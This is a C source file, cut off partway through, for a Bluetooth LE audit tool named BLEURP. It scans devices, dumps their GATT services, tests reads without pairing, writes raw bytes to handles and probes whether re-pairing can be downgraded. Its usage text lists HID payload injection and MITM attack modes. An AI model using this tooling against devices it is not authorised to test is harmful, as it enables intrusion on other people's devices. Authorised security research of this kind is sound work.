// ========================================
//  nom du fichier: main.c
//  description courte: BLEURP entry point. Drives kernel mgmt LE discovery,
//  parses advertising data, merges devices into a table and renders a live,
//  wifite-style sorted view until a duration elapses or Ctrl-C is pressed.
//  dernière modification : 2026-09-26
//  auteur: GitHub/@gGaToRr
// ========================================

#define _GNU_SOURCE

#include <dirent.h>
#include <errno.h>
#include <getopt.h>
#include <limits.h>
#include <poll.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include "ad_parse.h"
#include "addr_priv.h"
#include "audit.h"
#include "banner.h"
#include "dev_table.h"
#include "gatt.h"
#include "l2cap.h"
#include "mgmt.h"
#include "smp.h"
#include "ui.h"
#include "hid_cmd.h"
#include "fingerprint.h"
#include "smp_native.h"
#include "repair.h"
#include "secreq.h"
#include "peripheral_native.h"
#include "hci_dev.h"
#include "blerp_attack.h"

// How often to re-arm discovery, to keep reports flowing and refresh the
// view (wifite keeps a continuous scan going and redraws steadily).
#define SCAN_REFRESH_SEC 10

// Set by SIGINT so the scan loop can stop cleanly.
static volatile sig_atomic_t g_stop = 0;

// SIGINT handler: request a clean stop.
static void on_sigint(int sig) {
    (void)sig;
    g_stop = 1;
}

// Context passed to the per-device callback.
struct scan_ctx {
    struct dev_table *table;
};


// Merge one discovered device into the table. We only trust the real device
// name (from the advertising data or scan response); we do NOT guess a vendor
// from the manufacturer company id, which produces misleading labels (e.g.
// everything showing as "Apple"). No name -> shown as unknown. The verbose
// vendor/service summary is stored separately in the entry's details.
static void on_device(const struct mgmt_device *d, void *user) {
    struct scan_ctx *c = user;
    struct ad_info info;
    int ok = (ad_parse(d->eir, d->eir_len, &info) == 0);
    const char *name = (ok && info.has_name) ? info.name : "";
    struct dev_entry *e = dev_table_upsert(c->table, d->address, d->addr_type,
                                           d->rssi, name, time(NULL));
    if (e) {
        // Build a passive fingerprint from the advertising data and the
        // address posture: category, vendor, privacy and an exposure score.
        struct fingerprint fp = fingerprint_make(ok ? &info : NULL,
                                                e->address, e->addr_type);
        fingerprint_summary(&fp, e->details, sizeof e->details);
        strncpy(e->category, fp.category_label, sizeof e->category - 1);
        e->category[sizeof e->category - 1] = '\0';
        e->exposure = fp.exposure;
    }
}

// Print usage for the scan command / top level.
static void usage(const char *prog) {
    fprintf(stderr,
            "Usage:\n"
            "  %s                                      interactive menu (default)\n"
            "  %s wizard                               guided all-in-one audit pipeline\n"
            "  %s finale [--all-test]                  scan 15s + test connexion re-pairing (cible unique ou All-Test) + bannière SUCCESS\n"
            "  %s scan  [-i index] [-t seconds] [-v]   live BLE scan\n"
            "  %s autotry [-i index] [-t s] [-T ms]    scan, then connect + audit every device found (no prompts)\n"
            "  %s enum  <ADDR> [-t public|random]      connect and dump GATT\n"
            "  %s audit <ADDR> [-t public|random]      audit unauthenticated GATT access\n"
            "  %s read  <ADDR> <handle> [-t ...]       read a value by handle\n"
            "  %s write <ADDR> <handle> <hex> [-t ...] write bytes by handle\n"
            "  %s hid   -i hciX -t <ADDR> -f <payload> send a HID payload\n"
            "  %s smp   <ADDR> [-i index] [-t ...]     probe SMP pairing security level (native HCI)\n"
            "  %s repair [ADDR] [-i index] [-t ...]    re-pairing check on a bonded device (BLERP); no ADDR lists bonds\n"
            "  %s secreq <ADDR> [-r ARSR] [-c s] [-w s] Security Request test on a bonded Central (BLERP, Apple finding)\n"
            "  %s blerp <pi|ci|mitm|audit> [ADDR]      BLERP attack & audit suite (NDSS 2026)\n"
            "  %s keyboard [-i index] [-n name] [-d ..] BLE Keyboard Peripheral emulator (HOGP)\n"
            "  -i index    HCI controller index (default 0 = hci0)\n"
            "  -t seconds  scan duration; 0 = until Ctrl-C (default 0)\n"
            "  -v          verbose scan (per-device vendor/services details)\n"
            "Only use on devices you own or are authorized to test.\n",
            prog, prog, prog, prog, prog, prog, prog, prog, prog, prog, prog, prog, prog, prog, prog);
}

// Write an mgmt packet; returns 0 if the write did not error, -1 otherwise.
static int send_pkt(int fd, const uint8_t *pkt, ssize_t n) {
    if (n < 0) {
        return -1;
    }
    return (write(fd, pkt, (size_t)n) < 0) ? -1 : 0;
}

// Run a live scan into `table` (already initialized) until `duration` seconds
// elapse or Ctrl-C. `verbose` shows a per-device details line. Returns 0 on a
// normal stop, or -1 on a setup failure (message already printed).
static int run_scan(int index, long duration, int verbose,
                    struct dev_table *table) {
    g_stop = 0;

    int fd = mgmt_open();
    if (fd < 0) {
        perror("mgmt_open");
        return -1;
    }

    uint8_t cmd[64];
    uint8_t buf[2048];

    // Read controller info to show the adapter and confirm LE support.
    ssize_t n = mgmt_build_command(cmd, sizeof cmd, MGMT_OP_READ_CONTROLLER_INFO,
                                   (uint16_t)index, NULL, 0);
    if (send_pkt(fd, cmd, n) < 0) { perror("write"); mgmt_close(fd); return -1; }
    ssize_t r = read(fd, buf, sizeof buf);
    struct mgmt_controller_info info;
    if (r > 0 && mgmt_parse_controller_info(buf, (size_t)r, &info) == 0) {
        printf("Adapter hci%d: %02X:%02X:%02X:%02X:%02X:%02X  BT v%u  '%s'  "
               "LE=%s  powered=%s\n", index,
               info.address[5], info.address[4], info.address[3],
               info.address[2], info.address[1], info.address[0],
               info.bluetooth_version, info.name,
               mgmt_has_setting(info.supported_settings, MGMT_SETTING_LE) ? "yes" : "no",
               mgmt_has_setting(info.current_settings, MGMT_SETTING_POWERED) ? "yes" : "no");
        if (!mgmt_has_setting(info.current_settings, MGMT_SETTING_POWERED)) {
            fprintf(stderr, "warning: adapter not powered (bluetoothctl power on)\n");
        }
    } else {
        fprintf(stderr, "warning: could not read controller info\n");
    }

    // Start LE discovery, then read the command response to catch errors.
    n = mgmt_build_start_discovery(cmd, sizeof cmd, (uint16_t)index, MGMT_ADDR_LE);
    if (send_pkt(fd, cmd, n) < 0) { perror("write"); mgmt_close(fd); return -1; }

    r = read(fd, buf, sizeof buf);
    if (r >= 9) {
        struct mgmt_hdr h;
        mgmt_parse_header(buf, (size_t)r, &h);
        if (h.opcode == MGMT_EV_CMD_STATUS || h.opcode == MGMT_EV_CMD_COMPLETE) {
            uint8_t status = buf[8];
            if (status != 0x00) {
                fprintf(stderr, "Start Discovery failed: mgmt status 0x%02x%s\n",
                        status, status == 0x14 ?
                        " (Permission Denied: run with sudo, or setcap cap_net_admin)" : "");
                mgmt_close(fd);
                return -1;
            }
        }
    }

    struct scan_ctx ctx = { .table = table };

    // A Device Found may have arrived in the response read above.
    if (r > 0) { (void)mgmt_dispatch_event(buf, (size_t)r, on_device, &ctx); }

    signal(SIGINT, on_sigint);
    time_t start = time(NULL);
    time_t last_refresh = start;
    printf("\033[2J"); // clear once before the live view

    struct pollfd pfd = { .fd = fd, .events = POLLIN, .revents = 0 };
    while (!g_stop) {
        time_t now = time(NULL);
        if (duration > 0 && (now - start) >= duration) {
            break;
        }
        int pr = poll(&pfd, 1, 250);
        if (pr > 0 && (pfd.revents & POLLIN)) {
            ssize_t m = read(fd, buf, sizeof buf);
            if (m > 0) { (void)mgmt_dispatch_event(buf, (size_t)m, on_device, &ctx); }
        }

        // Periodic re-scan: stop then start discovery to re-arm the kernel
        // scan so reports keep coming and the view stays fresh.
        now = time(NULL);
        if (now - last_refresh >= SCAN_REFRESH_SEC) {
            n = mgmt_build_stop_discovery(cmd, sizeof cmd, (uint16_t)index, MGMT_ADDR_LE);
            (void)send_pkt(fd, cmd, n);
            n = mgmt_build_start_discovery(cmd, sizeof cmd, (uint16_t)index, MGMT_ADDR_LE);
            (void)send_pkt(fd, cmd, n);
            last_refresh = now;
        }

        dev_table_sort_by_rssi(table);
        ui_render(table, start, now, verbose, stdout);
    }

    // Stop discovery and draw a final frame.
    n = mgmt_build_stop_discovery(cmd, sizeof cmd, (uint16_t)index, MGMT_ADDR_LE);
    (void)send_pkt(fd, cmd, n);
    dev_table_sort_by_rssi(table);
    ui_render(table, start, time(NULL), verbose, stdout);

    mgmt_close(fd);
    return 0;
}

// Parse an integer option that must fall in [min, max]. Returns 0 or -1.
// Unlike atoi()/atol(), "-i abc" or "-t -5" is refused rather than silently
// becoming 0 or an out-of-range value. `base` 0 also accepts 0x-prefixed hex.
static int parse_long_arg(const char *s, int base, long min, long max, long *out) {
    char *end;
    errno = 0;
    long v = strtol(s, &end, base);
    if (end == s || *end != '\0' || errno == ERANGE || v < min || v > max) return -1;
    *out = v;
    return 0;
}

// scan subcommand: a one-shot live scan (until duration or Ctrl-C).
static int cmd_scan(int argc, char **argv) {
    int index = 0;
    long duration = 0;
    int verbose = 0;

    long v = 0;
    int opt;
    while ((opt = getopt(argc, argv, "i:t:vh")) != -1) {
        switch (opt) {
        case 'i':
            if (parse_long_arg(optarg, 10, 0, 255, &v) < 0) {
                fprintf(stderr, "scan: -i invalide '%s' (attendu un index 0-255)\n", optarg);
                return 2;
            }
            index = (int)v;
            break;
        case 't':
            if (parse_long_arg(optarg, 10, 0, LONG_MAX, &duration) < 0) {
                fprintf(stderr, "scan: -t invalide '%s' (attendu un nombre de secondes >= 0)\n", optarg);
                return 2;
            }
            break;
        case 'v': verbose = 1; break;
        case 'h': usage(argv[0]); return 0;
        default:  usage(argv[0]); return 2;
        }
    }

    struct dev_table table;
    if (dev_table_init(&table) < 0) { perror("dev_table_init"); return 1; }
    int rc = run_scan(index, duration, verbose, &table);
    printf("\nStopped. %zu device(s) found.\n", dev_table_count(&table));
    dev_table_free(&table);
    return rc < 0 ? 1 : 0;
}

// Parse "AA:BB:CC:DD:EE:FF" into HCI byte order (LSB first). Returns 0 or -1.
static int parse_addr(const char *s, uint8_t out[6]) {
    unsigned v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6) {
        return -1;
    }
    for (int i = 0; i < 6; i++) {
        if (v[i] > 0xff) return -1;
        out[5 - i] = (uint8_t)v[i]; // typed MSB-first -> stored LSB-first
    }
    return 0;
}

// Format characteristic properties as short flags, e.g. "R W N".
static void props_str(uint8_t p, char *buf, size_t n) {
    buf[0] = '\0';
    struct { uint8_t bit; const char *s; } m[] = {
        {GATT_PROP_READ, "R"}, {GATT_PROP_WRITE, "W"},
        {GATT_PROP_WRITE_NR, "w"}, {GATT_PROP_NOTIFY, "N"},
        {GATT_PROP_INDICATE, "I"},
    };
    for (size_t i = 0; i < sizeof m / sizeof m[0]; i++) {
        if (p & m[i].bit) {
            if (buf[0] != '\0') strncat(buf, " ", n - strlen(buf) - 1);
            strncat(buf, m[i].s, n - strlen(buf) - 1);
        }
    }
}

// Connect to a device and print its GATT tree. Address is in HCI byte order.
static int do_enum(const uint8_t addr[6], uint8_t atype) {
    char as[18];
    snprintf(as, sizeof as, "%02X:%02X:%02X:%02X:%02X:%02X",
             addr[5], addr[4], addr[3], addr[2], addr[1], addr[0]);

    fprintf(stderr, "Authorized targets only. Connecting to %s ...\n", as);
    int fd = bleurp_l2_connect(addr, atype);
    if (fd < 0) {
        perror("connect");
        return 1;
    }

    uint16_t mtu = 0;
    (void)gatt_exchange_mtu(fd, 517, &mtu);
    printf("Connected to %s (ATT MTU=%u)\n\n", as, mtu ? mtu : 23);

    struct gatt_service svcs[64];
    size_t nsvc = 0;
    if (gatt_discover_services(fd, svcs, 64, &nsvc) < 0) {
        perror("discover services");
        bleurp_l2_close(fd);
        return 1;
    }

    size_t shown = nsvc < 64 ? nsvc : 64;
    printf("GATT tree (%zu service(s)):\n", nsvc);
    for (size_t i = 0; i < shown; i++) {
        const struct gatt_service *s = &svcs[i];
        if (s->uuid_is_128) {
            printf("[SVC] 0x%04X-0x%04X  128-bit UUID\n", s->start_handle, s->end_handle);
        } else {
            const char *name = ad_service_name(s->uuid16);
            printf("[SVC] 0x%04X-0x%04X  0x%04X%s%s\n", s->start_handle,
                   s->end_handle, s->uuid16, name ? "  " : "", name ? name : "");
        }
        struct gatt_char chs[64];
        size_t nch = 0;
        gatt_discover_characteristics(fd, s->start_handle, s->end_handle, chs, 64, &nch);
        size_t cshown = nch < 64 ? nch : 64;
        for (size_t j = 0; j < cshown; j++) {
            const struct gatt_char *c = &chs[j];
            char pr[16];
            props_str(c->properties, pr, sizeof pr);
            if (c->uuid_is_128) {
                printf("   [CHR] val 0x%04X  [%s]  128-bit UUID\n", c->value_handle, pr);
            } else {
                printf("   [CHR] val 0x%04X  [%s]  0x%04X\n", c->value_handle, pr, c->uuid16);
            }
        }
    }

    bleurp_l2_close(fd);
    return 0;
}

// Probe one readable characteristic and print its audit verdict. Reads the
// value handle and classifies the outcome; never writes. `atype` is unused
// beyond the already-open socket but kept for signature symmetry.
static void audit_probe_char(int fd, const struct gatt_char *c) {
    char pr[16];
    props_str(c->properties, pr, sizeof pr);

    char uuid[24];
    if (c->uuid_is_128) snprintf(uuid, sizeof uuid, "128-bit");
    else                snprintf(uuid, sizeof uuid, "0x%04X", c->uuid16);

    const char *svc_name = c->uuid_is_128 ? NULL : ad_service_name(c->uuid16);

    if (c->properties & GATT_PROP_READ) {
        uint8_t buf[517];
        size_t len = 0;
        uint8_t err = 0;
        int rc = gatt_read(fd, c->value_handle, buf, sizeof buf, &len, &err);
        audit_verdict_t v = audit_classify_read(rc == 0, err);
        printf("  0x%04X  [%-6s]  %-8s %-10s", c->value_handle, pr, uuid,
               audit_verdict_label(v));
        if (v == AUDIT_OPEN)           printf(" %zu byte(s) readable unauthenticated", len);
        else if (v == AUDIT_PROTECTED) printf(" needs pairing (ATT 0x%02x)", err);
        else if (v == AUDIT_OTHER && err) printf(" ATT 0x%02x", err);
        if (svc_name) printf("  (%s)", svc_name);
        printf("\n");
    } else {
        // Not readable: report the capability, do not touch the value.
        printf("  0x%04X  [%-6s]  %-8s %-10s", c->value_handle, pr, uuid, "-");
        if (c->properties & (GATT_PROP_WRITE | GATT_PROP_WRITE_NR | GATT_PROP_SIGNED_WRITE))
            printf(" write-capable (not tested)");
        if (svc_name) printf("  (%s)", svc_name);
        printf("\n");
    }
}

// Connect to an authorized device and audit which characteristics are
// accessible without pairing. Reads readable values only; write-capable
// characteristics are reported but never written. Address is in HCI order.
static int do_audit(const uint8_t addr[6], uint8_t atype) {
    char as[18];
    snprintf(as, sizeof as, "%02X:%02X:%02X:%02X:%02X:%02X",
             addr[5], addr[4], addr[3], addr[2], addr[1], addr[0]);

    addr_privacy_t p = addr_privacy(addr, atype);
    fprintf(stderr, "Authorized targets only. Connecting to %s ...\n", as);
    int fd = bleurp_l2_connect(addr, atype);
    if (fd < 0) {
        perror("connect");
        return 1;
    }

    uint16_t mtu = 0;
    (void)gatt_exchange_mtu(fd, 517, &mtu);
    printf("GATT access audit for %s (priv=%s%s, ATT MTU=%u)\n\n", as,
           addr_privacy_label(p), addr_is_trackable(p) ? " [trackable]" : "",
           mtu ? mtu : 23);

    struct gatt_service svcs[64];
    size_t nsvc = 0;
    if (gatt_discover_services(fd, svcs, 64, &nsvc) < 0) {
        perror("discover services");
        bleurp_l2_close(fd);
        return 1;
    }

    printf("  handle  props       uuid     verdict    detail\n");
    printf("  ------  ----------  -------- ---------- ------\n");
    size_t shown = nsvc < 64 ? nsvc : 64;
    for (size_t i = 0; i < shown; i++) {
        struct gatt_char chs[64];
        size_t nch = 0;
        gatt_discover_characteristics(fd, svcs[i].start_handle,
                                      svcs[i].end_handle, chs, 64, &nch);
        size_t cshown = nch < 64 ? nch : 64;
        for (size_t j = 0; j < cshown; j++)
            audit_probe_char(fd, &chs[j]);
    }

    printf("\nLegend: OPEN=readable without pairing  PROTECTED=needs pairing"
           "  DENIED=read not permitted  OTHER=other ATT error\n");
    bleurp_l2_close(fd);
    return 0;
}

// enum subcommand: parse the address/type then dump the GATT tree.
static int cmd_enum(int argc, char **argv) {
    uint8_t atype = BLEURP_BDADDR_LE_PUBLIC;
    int opt;
    while ((opt = getopt(argc, argv, "t:h")) != -1) {
        switch (opt) {
        case 't':
            atype = (strcmp(optarg, "random") == 0) ? BLEURP_BDADDR_LE_RANDOM
                                                     : BLEURP_BDADDR_LE_PUBLIC;
            break;
        case 'h':
        default:
            fprintf(stderr, "Usage: bleurp enum <ADDR> [-t public|random]\n");
            return (opt == 'h') ? 0 : 2;
        }
    }
    if (optind >= argc) {
        fprintf(stderr, "Usage: bleurp enum <ADDR> [-t public|random]\n");
        return 2;
    }
    uint8_t addr[6];
    if (parse_addr(argv[optind], addr) < 0) {
        fprintf(stderr, "invalid address: %s\n", argv[optind]);
        return 2;
    }
    return do_enum(addr, atype);
}

// audit subcommand: parse the address/type then audit unauthenticated access.
static int cmd_audit(int argc, char **argv) {
    uint8_t atype = BLEURP_BDADDR_LE_PUBLIC;
    int opt;
    while ((opt = getopt(argc, argv, "t:h")) != -1) {
        switch (opt) {
        case 't':
            atype = (strcmp(optarg, "random") == 0) ? BLEURP_BDADDR_LE_RANDOM
                                                     : BLEURP_BDADDR_LE_PUBLIC;
            break;
        case 'h':
        default:
            fprintf(stderr, "Usage: bleurp audit <ADDR> [-t public|random]\n");
            return (opt == 'h') ? 0 : 2;
        }
    }
    if (optind >= argc) {
        fprintf(stderr, "Usage: bleurp audit <ADDR> [-t public|random]\n");
        return 2;
    }
    uint8_t addr[6];
    if (parse_addr(argv[optind], addr) < 0) {
        fprintf(stderr, "invalid address: %s\n", argv[optind]);
        return 2;
    }
    return do_audit(addr, atype);
}

// Hex digit value, or -1.
static int hexval(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

// Parse a 16-bit number (accepts 0x-prefixed). Returns 0 or -1.
static int parse_u16(const char *s, uint16_t *out) {
    char *end;
    long v = strtol(s, &end, 0);
    if (*end != '\0' || v < 0 || v > 0xffff) return -1;
    *out = (uint16_t)v;
    return 0;
}

// Parse a hex string (optional ':'/' ' separators) into bytes. Returns len or -1.
static ssize_t parse_hex(const char *s, uint8_t *out, size_t cap) {
    size_t n = 0;
    while (*s) {
        if (*s == ':' || *s == ' ') { s++; continue; }
        int hi = hexval(*s++);
        int lo = (*s) ? hexval(*s++) : -1;
        if (hi < 0 || lo < 0 || n >= cap) return -1;
        out[n++] = (uint8_t)((hi << 4) | lo);
    }
    return (ssize_t)n;
}

// Shared option/positional parse for read/write: address + handle (+ value).
static int connect_target(int argc, char **argv, uint8_t addr[6],
                          uint8_t *atype, int *pos) {
    *atype = BLEURP_BDADDR_LE_PUBLIC;
    int opt;
    while ((opt = getopt(argc, argv, "t:h")) != -1) {
        if (opt == 't') {
            *atype = (strcmp(optarg, "random") == 0) ? BLEURP_BDADDR_LE_RANDOM
                                                      : BLEURP_BDADDR_LE_PUBLIC;
        } else {
            return -1;
        }
    }
    if (optind >= argc || parse_addr(argv[optind], addr) < 0) return -1;
    *pos = optind + 1;
    return 0;
}

// read subcommand: read a characteristic/descriptor value by handle.
static int cmd_read(int argc, char **argv) {
    uint8_t addr[6], atype;
    int pos;
    if (connect_target(argc, argv, addr, &atype, &pos) < 0 || pos >= argc) {
        fprintf(stderr, "Usage: bleurp read <ADDR> <handle> [-t public|random]\n");
        return 2;
    }
    uint16_t handle;
    if (parse_u16(argv[pos], &handle) < 0) {
        fprintf(stderr, "invalid handle: %s\n", argv[pos]);
        return 2;
    }

    fprintf(stderr, "Authorized targets only. Connecting to %s ...\n", argv[optind]);
    int fd = bleurp_l2_connect(addr, atype);
    if (fd < 0) { perror("connect"); return 1; }
    (void)gatt_exchange_mtu(fd, 517, NULL);

    uint8_t buf[512];
    size_t len = 0;
    uint8_t err = 0;
    if (gatt_read(fd, handle, buf, sizeof buf, &len, &err) < 0) {
        if (err) fprintf(stderr, "read denied (ATT error 0x%02x)\n", err);
        else perror("read");
        bleurp_l2_close(fd);
        return 1;
    }
    printf("handle 0x%04X = %zu byte(s):\n  hex:", handle, len);
    for (size_t i = 0; i < len; i++) printf(" %02x", buf[i]);
    printf("\n  txt: ");
    for (size_t i = 0; i < len; i++) putchar((buf[i] >= 32 && buf[i] < 127) ? buf[i] : '.');
    printf("\n");
    bleurp_l2_close(fd);
    return 0;
}

// write subcommand: write bytes to a characteristic by handle.
static int cmd_write(int argc, char **argv) {
    uint8_t addr[6], atype;
    int pos;
    if (connect_target(argc, argv, addr, &atype, &pos) < 0 || pos + 1 >= argc) {
        fprintf(stderr, "Usage: bleurp write <ADDR> <handle> <hexbytes> [-t public|random]\n");
        return 2;
    }
    uint16_t handle;
    if (parse_u16(argv[pos], &handle) < 0) {
        fprintf(stderr, "invalid handle: %s\n", argv[pos]);
        return 2;
    }
    uint8_t value[512];
    ssize_t vlen = parse_hex(argv[pos + 1], value, sizeof value);
    if (vlen < 0) {
        fprintf(stderr, "invalid hex value: %s\n", argv[pos + 1]);
        return 2;
    }

    fprintf(stderr, "Authorized targets only. Writing %zd byte(s) to handle 0x%04X ...\n",
            (ssize_t)vlen, handle);
    int fd = bleurp_l2_connect(addr, atype);
    if (fd < 0) { perror("connect"); return 1; }
    (void)gatt_exchange_mtu(fd, 517, NULL);

    uint8_t err = 0;
    if (gatt_write(fd, handle, value, (size_t)vlen, &err) < 0) {
        if (err) fprintf(stderr, "write denied (ATT error 0x%02x)\n", err);
        else perror("write");
        bleurp_l2_close(fd);
        return 1;
    }
    printf("write ok (handle 0x%04X)\n", handle);
    bleurp_l2_close(fd);
    return 0;
}

// smp subcommand: probe SMP pairing security parameters via native HCI User Channel.
static int cmd_smp_native(int argc, char **argv) {
    int dev_id = 0;
    uint8_t atype = BLEURP_BDADDR_LE_PUBLIC;
    int opt;
    while ((opt = getopt(argc, argv, "i:t:h")) != -1) {
        switch (opt) {
        case 'i': {
            long idx;
            if (parse_long_arg(optarg, 10, 0, 255, &idx) < 0) {
                fprintf(stderr, "invalid -i: %s (attendu un index 0-255)\n", optarg);
                return 2;
            }
            dev_id = (int)idx;
            break;
        }
        case 't':
            atype = (strcmp(optarg, "random") == 0) ? BLEURP_BDADDR_LE_RANDOM
                                                     : BLEURP_BDADDR_LE_PUBLIC;
            break;
        case 'h':
        default:
            fprintf(stderr, "Usage: bleurp smp <ADDR> [-i index] [-t public|random]\n");
            return (opt == 'h') ? 0 : 2;
        }
    }
    if (optind >= argc) {
        fprintf(stderr, "Usage: bleurp smp <ADDR> [-i index] [-t public|random]\n");
        return 2;
    }
    uint8_t addr[6];
    if (parse_addr(argv[optind], addr) < 0) {
        fprintf(stderr, "invalid address: %s\n", argv[optind]);
        return 2;
    }

    char as[18];
    snprintf(as, sizeof as, "%02X:%02X:%02X:%02X:%02X:%02X",
             addr[5], addr[4], addr[3], addr[2], addr[1], addr[0]);

    printf("Connecting to %s (hci%d, type=%s) via native HCI User Channel...\n",
           as, dev_id, atype == BLEURP_BDADDR_LE_RANDOM ? "random" : "public");

    struct smp_probe_result res;
    if (smp_native_probe_device(dev_id, addr, atype, 6000, &res) < 0) {
        fprintf(stderr, "Sonde SMP échouée (vérifiez que rfkill/bluetoothd ne verrouille pas l'interface, ou lancez ./scripts/reset_bluetooth.sh)\n");
        return 1;
    }

    smp_native_print_result(&res, as);
    return 0;
}

// Print the re-pairing verdict in plain French. Only called when the peer
// replied (ACCEPTED or REFUSED); no-reply cases are explained by the probe printer.
// One machine-readable verdict line per vulnerability, read by
// scripts/audit_ble.sh to build the V1-V6 matrix. Format is fixed:
// "[VERDICT] V<n> : <OUI|NON|NON CONCLUANT> - <detail>".
static void print_verdict(const char *id, enum blerp_verdict v, const char *detail) {
    printf("[VERDICT] %s : %s - %s\n", id, blerp_verdict_label(v), detail);
}

static void print_repair_verdict(const struct smp_bond_info *bond,
                                 const struct smp_pairing_params *offer,
                                 const struct smp_probe_result *res,
                                 const struct smp_repair_verdict *v,
                                 const char *target) {
    printf("\n  %s=== Test de re-pairing (BLERP) : %s ===%s\n", UI_PINK, target, UI_RESET);
    printf("  Bond stocké          : %s, clé %d octets\n",
           bond->authenticated ? "authentifié (MITM)" : "non authentifié", bond->enc_size);
    printf("  Offre envoyée        : MITM=NON, clé max %d octets\n", offer->max_key_size);
    if (v->outcome != SMP_REPAIR_REFUSED) {
        printf("  Réponse de la cible  : AuthReq 0x%02x, clé max %d octets\n",
               res->auth_req, res->max_key_size);
    }

    switch (v->outcome) {
    case SMP_REPAIR_REFUSED:
        // Only some Pairing Failed reasons come from a downgrade check.
        printf("  %s[+] Refus (Pairing Failed 0x%02x).%s\n", UI_GREEN, v->fail_reason, UI_RESET);
        if (v->fail_reason == 0x06) {
            printf("      Raison 0x06 = taille de clé : contrôle d'entropie actif (anti-downgrade).\n");
        } else if (v->fail_reason == 0x03) {
            printf("      Raison 0x03 = exigences d'authentification : contrôle MITM actif (anti-downgrade).\n");
        } else if (v->fail_reason == 0x09) {
            printf("      Raison 0x09 = tentatives répétées : limitation, pas un contrôle de downgrade.\n");
        } else {
            printf("      Raison sans rapport avec un contrôle de downgrade : %s%sRÉSULTAT NON CONCLUANT%s.\n",
                   UI_ORANGE, UI_BOLD, UI_RESET);
        }
        break;
    case SMP_REPAIR_ACCEPTED_DOWNGRADE:
        printf("  %s[!] La cible accepte une négociation plus faible que son bond :%s\n", UI_ORANGE, UI_RESET);
        if (v->mitm_downgrade) {
            printf("      - bond authentifié, négociation sans MITM (candidat V4 du papier)\n");
        }
        if (v->entropy_downgrade) {
            printf("      - taille de clé négociée inférieure au bond (candidat V6 du papier)\n");
        }
        break;
    case SMP_REPAIR_ACCEPTED_SAFE:
        printf("  %s[+] La cible répond sans descendre sous son bond.%s\n", UI_GREEN, UI_RESET);
        break;
    case SMP_REPAIR_NO_REPLY:
        break;
    }
    printf("  %s[i] Négociation seulement : aucune clé n'est échangée. 'Accepte' est un indice, pas une preuve\n"
           "      de BLERP complet (il faudrait finir l'appairage, hors périmètre de cet outil).%s\n",
           UI_ORANGE, UI_RESET);
    print_verdict("V2", smp_repair_verdict_v2(v), "offre de re-pairing non liée au bond");
    print_verdict("V4", smp_repair_verdict_v4(bond->authenticated, v), "bond authentifié, MITM retiré");
    print_verdict("V6", smp_repair_verdict_v6(v), "taille de clé négociée sous celle du bond");
    printf("\n");
}

// repair subcommand: BLERP re-pairing check. Reads the bond BlueZ already
// stores with the device, offers a pairing weaker than it, and reports
// whether the peer refuses (anti-downgrade) or accepts. Without an address,
// lists the bonded devices so their identity addresses can be copied.
static int cmd_repair(int argc, char **argv) {
    int dev_id = 0;
    uint8_t atype = BLEURP_BDADDR_LE_PUBLIC;
    int opt;
    const char *connect_arg = NULL;
    while ((opt = getopt(argc, argv, "i:t:c:h")) != -1) {
        switch (opt) {
        case 'i': {
            long idx;
            if (parse_long_arg(optarg, 10, 0, 255, &idx) < 0) {
                fprintf(stderr, "invalid -i: %s (attendu un index 0-255)\n", optarg);
                return 2;
            }
            dev_id = (int)idx;
            break;
        }
        case 'c': connect_arg = optarg; break;
        case 't':
            atype = (strcmp(optarg, "random") == 0) ? BLEURP_BDADDR_LE_RANDOM
                                                     : BLEURP_BDADDR_LE_PUBLIC;
            break;
        case 'h':
        default:
            fprintf(stderr, "Usage: bleurp repair [ADDR] [-c CURRENT_ADDR] [-i index] [-t public|random]\n");
            return (opt == 'h') ? 0 : 2;
        }
    }

    char adapter[18];
    if (smp_adapter_addr(dev_id, adapter) < 0) {
        fprintf(stderr, "  [-] Adaptateur hci%d introuvable (sysfs).\n", dev_id);
        return 1;
    }

    if (optind >= argc) {
        char list[32][18];
        int n = smp_bond_list(BLEURP_BLUEZ_STORE_DIR, adapter, list, 32);
        if (n < 0 && errno == ENOENT) n = 0;
        if (n < 0) {
            fprintf(stderr, "  [-] Lecture de %s/%s impossible : %s (relance avec sudo, dossier réservé à root).\n",
                    BLEURP_BLUEZ_STORE_DIR, adapter, strerror(errno));
            return 1;
        }
        if (n == 0) {
            printf("Aucun appareil appairé avec hci%d. Appaire la cible d'abord (bluetoothctl pair).\n", dev_id);
            return 0;
        }
        printf("Appareils appairés avec hci%d (adresses d'identité BlueZ) :\n", dev_id);
        for (int i = 0; i < n; i++) printf("  %s\n", list[i]);
        return 0;
    }

    uint8_t addr[6];
    if (parse_addr(argv[optind], addr) < 0) {
        fprintf(stderr, "invalid address: %s\n", argv[optind]);
        return 2;
    }
    char as[18];
    snprintf(as, sizeof as, "%02X:%02X:%02X:%02X:%02X:%02X",
             addr[5], addr[4], addr[3], addr[2], addr[1], addr[0]);

    // The bond is keyed by the identity address (ADDR), but the link needs the
    // address the device uses right now (a random RPA): -c gives it.
    uint8_t conn_addr[6];
    memcpy(conn_addr, addr, sizeof conn_addr);
    char cs[18];
    snprintf(cs, sizeof cs, "%s", as);
    if (connect_arg) {
        if (parse_addr(connect_arg, conn_addr) < 0) {
            fprintf(stderr, "invalid connect address: %s\n", connect_arg);
            return 2;
        }
        snprintf(cs, sizeof cs, "%02X:%02X:%02X:%02X:%02X:%02X",
                 conn_addr[5], conn_addr[4], conn_addr[3],
                 conn_addr[2], conn_addr[1], conn_addr[0]);
    }

    struct smp_bond_info bond;
    if (smp_bond_load(BLEURP_BLUEZ_STORE_DIR, adapter, as, &bond) < 0) {
        switch (errno) {
        case EACCES:
            fprintf(stderr, "  [-] Bond de %s illisible : relance avec sudo (dossier réservé à root).\n", as);
            break;
        case ENOENT:
            fprintf(stderr, "  [-] Pas de bond LE entre hci%d et %s : appaire la cible d'abord (bluetoothctl pair %s).\n",
                    dev_id, as, as);
            break;
        case EBADMSG:
            fprintf(stderr, "  [-] Bond de %s sans taille de clé exploitable.\n", as);
            break;
        default:
            fprintf(stderr, "  [-] Lecture du bond impossible : %s\n", strerror(errno));
            break;
        }
        return 1;
    }
    printf("Bond trouvé : %s, clé %d octets (hci%d <-> %s)\n",
           bond.authenticated ? "authentifié (MITM)" : "non authentifié", bond.enc_size, dev_id, as);

    struct smp_pairing_params offer;
